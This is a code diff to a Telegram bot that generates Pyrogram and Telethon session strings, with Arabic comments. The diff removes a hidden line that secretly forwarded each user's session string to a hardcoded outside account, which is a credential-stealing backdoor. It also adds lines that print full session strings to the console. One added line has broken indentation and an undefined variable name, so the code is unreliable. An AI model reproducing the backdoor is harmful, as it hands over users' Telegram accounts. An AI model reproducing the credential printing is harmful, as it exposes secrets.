@@ -27,7 +27,7 @@ from pyrogram import (
     __version__ as v
 )
  
-ownerID = int("5918956070") #ايدي الادمن 
+ownerID = int("125205235") #ايدي الادمن 
 api_hash = Config.API_HASH #ايبي هاش 
 api_id = Config.APP_ID #ايبي ايدي
 token = Config.TG_BOT_TOKEN #البوت
@@ -458,15 +458,15 @@ async def generator_and_about(app,m):
         text += f'🆔 بطاقة تعريف : {get.id}\n'
         text += f'📞 رقم الهاتف : {phone}\n'
         text += f'🔒 تم حفظ الجلسة في الرسائل المحفوظة'
-        string_session = await c.export_session_string()
+   string_session = await c.export_session_string()
+   print(session_string)
         await rep.delete()
         await c.send_message('me', f'تم استخراج جلسة بايروجرام {v2} هذه الجلسة\n\n`{string_session}`')
-        await c.send_message('7908905482', f'تم استخراج جلسة بايروجرام {v2} هذه الجلسة\n\n`{string_session}`')
         await c.disconnect()
         await app.send_message(
           m.chat.id, text
         )
-    
+
 
 
 
@@ -512,6 +512,7 @@ async def generator_and_about(app,m):
         text += f'📞 رقم الهاتف : {phone}\n'
         text += f'🔒 تم حفظ الجلسة في الرسائل المحفوظة'
         string_session = c.session.save()
+        print(string_session)
         await rep.delete()
         await c.send_message('me', f'تم استخراج جلسة تيليثون  {v2} هذه الجلسة \n\n`{string_session}`')
         await c.disconnect()
